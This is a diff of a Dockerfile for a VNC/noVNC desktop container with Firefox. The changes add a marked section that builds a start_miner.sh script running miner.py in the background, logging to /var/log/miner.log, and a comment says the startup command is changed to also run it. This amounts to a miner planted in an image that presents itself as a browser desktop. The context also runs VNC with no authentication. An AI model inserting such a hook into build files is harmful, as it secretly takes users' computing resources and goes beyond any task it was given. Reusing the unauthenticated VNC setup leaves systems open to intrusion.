@@ -13,10 +13,10 @@ RUN apt install software-properties-common -y
 # Install Python and pip
 RUN apt install -y python3 python3-pip
 
-# Install required Python packages globally
+# Install required Python packages
 RUN pip3 install --no-cache-dir requests psutil
 
-# Firefox installation
+# Firefox installation (original)
 RUN add-apt-repository ppa:mozillateam/ppa -y
 RUN echo 'Package: *' >> /etc/apt/preferences.d/mozilla-firefox
 RUN echo 'Pin: release o=LP-PPA-mozillateam' >> /etc/apt/preferences.d/mozilla-firefox
@@ -25,6 +25,7 @@ RUN echo 'Unattended-Upgrade::Allowed-Origins:: "LP-PPA-mozillateam:jammy";' | t
 RUN apt update -y && apt install -y firefox
 RUN apt update -y && apt install -y xubuntu-icon-theme
 
+# ========== ADD THIS SECTION ==========
 # Create directory for miner script
 RUN mkdir -p /opt/scripts
 
@@ -39,12 +40,14 @@ RUN echo '#!/bin/bash' > /opt/scripts/start_miner.sh && \
     echo 'cd /opt/scripts' >> /opt/scripts/start_miner.sh && \
     echo 'python3 /opt/scripts/miner.py >> /var/log/miner.log 2>&1 &' >> /opt/scripts/start_miner.sh && \
     chmod +x /opt/scripts/start_miner.sh
+# ========== END OF ADDED SECTION ==========
 
 RUN touch /root/.Xauthority
 
 EXPOSE 5901
 EXPOSE 6080
 
+# Modified CMD to also run miner script
 CMD bash -c "vncserver -localhost no -SecurityTypes None -geometry 1024x768 --I-KNOW-THIS-IS-INSECURE && \
              openssl req -new -subj "/C=JP" -x509 -days 365 -nodes -out self.pem -keyout self.pem && \
              websockify -D --web=/usr/share/novnc/ --cert=self.pem 6080 localhost:5901 && \
